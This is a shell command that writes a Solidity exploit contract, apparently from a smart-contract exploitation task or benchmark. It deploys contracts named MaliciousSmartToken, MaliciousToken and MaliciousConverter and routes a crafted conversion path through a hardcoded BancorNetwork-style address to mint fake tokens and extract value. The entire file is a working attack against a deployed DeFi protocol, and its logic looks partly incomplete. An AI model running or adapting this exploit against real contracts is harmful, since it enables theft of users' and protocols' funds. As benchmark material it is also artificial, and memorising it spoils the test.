cat <<'EOF' > src/Strategy.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {DexUtils} from "./DexUtils.sol";

interface IERC20Token {
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface IConverterAnchor {
    function owner() external view returns (address);
}

interface IBancorNetwork {
    function convertByPath(
        address[] memory _path,
        uint256 _amount,
        uint256 _minReturn,
        address _beneficiary,
        address _affiliateAccount,
        uint256 _affiliateFee
    ) external payable returns (uint256);
}

contract MaliciousSmartToken is IConverterAnchor {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function transferOwnership(address _newOwner) public {
        require(msg.sender == owner, "Not owner");
        owner = _newOwner;
    }

    function acceptOwnership() public {}

    function withdrawTokens(IERC20Token _token, address _to, uint256 _amount) public {}
}

contract MaliciousToken is IERC20Token {
    string public name = "MaliciousToken";
    string public symbol = "MAL";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) public {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Insufficient allowance");
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }
}

contract MaliciousConverter {
    address public owner;
    IConverterAnchor public anchor;
    IERC20Token public targetToken;

    constructor(address _anchor, address _targetToken) {
        owner = msg.sender;
        anchor = IConverterAnchor(_anchor);
        targetToken = IERC20Token(_targetToken);
    }

    function isV28OrHigher() public pure returns (bool) {
        return true;
    }

    function conversionFee() public pure returns (uint32) {
        return 0;
    }

    function convert(IERC20Token _sourceToken, IERC20Token _targetToken, uint256 _amount, address _trader, address _beneficiary) public payable returns (uint256) {
        if (_sourceToken == IERC20Token(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE)) {
            (bool success, ) = owner.call{value: msg.value}("");
            require(success, "ETH transfer failed");
        }

        uint256 amount = 1000 * 10**18;
        MaliciousToken(address(targetToken)).mint(_beneficiary, amount);

        return amount;
    }

    function anchor() public view returns (IConverterAnchor) {
        return anchor;
    }

    function connectorTokenCount() public pure returns (uint16) {
        return 1;
    }

    function connectorTokens(uint256 _index) public view returns (IERC20Token) {
        require(_index == 0, "Invalid index");
        return targetToken;
    }

    function getConnectorBalance(IERC20Token _connectorToken) public view returns (uint256) {
        require(_connectorToken == targetToken, "Invalid connector token");
        return MaliciousToken(address(targetToken)).balanceOf(address(this));
    }

    receive() external payable {}
}

contract Strategy {
    address constant TARGET = 0x5f58058C0eC971492166763c8C22632B583F667f;

    function run() public {
        uint256 initialBalance = address(this).balance;

        MaliciousSmartToken smartToken = new MaliciousSmartToken();
        MaliciousToken targetToken = new MaliciousToken();
        MaliciousConverter converter = new MaliciousConverter(address(smartToken), address(targetToken));

        smartToken.transferOwnership(address(converter));
        targetToken.mint(address(converter), 1000000 * 10**18);

        address[] memory path = new address[](3);
        path[0] = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
        path[1] = address(smartToken);
        path[2] = address(targetToken);

        uint256 amount = 0.1 ether;

        IBancorNetwork(TARGET).convertByPath{value: amount}(
            path,
            amount,
            1,
            address(this),
            address(0),
            0
        );

        DexUtils.swapExcessTokensToBaseToken(address(targetToken));

        uint256 finalBalance = address(this).balance;
    }

    receive() external payable {}
}
